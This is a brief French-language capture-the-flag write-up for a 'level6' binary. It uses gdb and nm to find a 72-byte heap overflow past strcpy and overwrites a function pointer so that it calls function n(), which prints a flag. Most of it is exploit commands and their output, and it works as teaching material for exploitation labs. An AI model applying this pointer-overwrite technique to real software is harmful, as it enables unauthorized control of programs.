# уровень 6

- L'idée ici est de faire en sorte que la fonction n soit appeler par le programme. Grace à la variable f.

<pre>
$> gdb ./level6

(gdb) disass main
Dump of assembler code for function main:
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:    mov    0x18(%esp),%eax
   0x080484ce <+82>:    mov    (%eax),%eax
<strong>   0x080484d0 <+84>:    call   *%eax</strong>
   0x080484d2 <+86>:    leave 
   0x080484d3 <+87>:    ret
End of assembler dump.
</pre>

- Nous placons un breakpoint sur le call de f pour faire des tests et trouver les bon offset.

<pre>
(gdb) b *0x080484d0
Breakpoint 1 at 0x80484d0
(gdb) r $(python -c "print('A' * 72 + 'BBBB')")

Starting program: /home/user/level6/level6 $(python -c "print('A' * 72 + 'BBBB')")

Breakpoint 1, 0x080484d0 in main ()
<strong>(gdb) x/s $eax
0x42424242:      Address 0x42424242 out of bounds
</strong>
</pre>

- Bingo nous arrivons bien à ecrire sur la memoire. Il ne nous reste plus qu'à placer l'adresse de la fonction n().

<pre>
$> nm level6

...
08048468 T m
0804847c T main
         U malloc@@GLIBC_2.0
<strong>08048454 T n</strong>
...
</pre>

- Ce qui nous donnes en little indian: 54 84 04 08

<pre>
$> ./level6 $(python -c "print('A' * 72 + '\x54\x84\x04\x08')")

f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d

</pre>
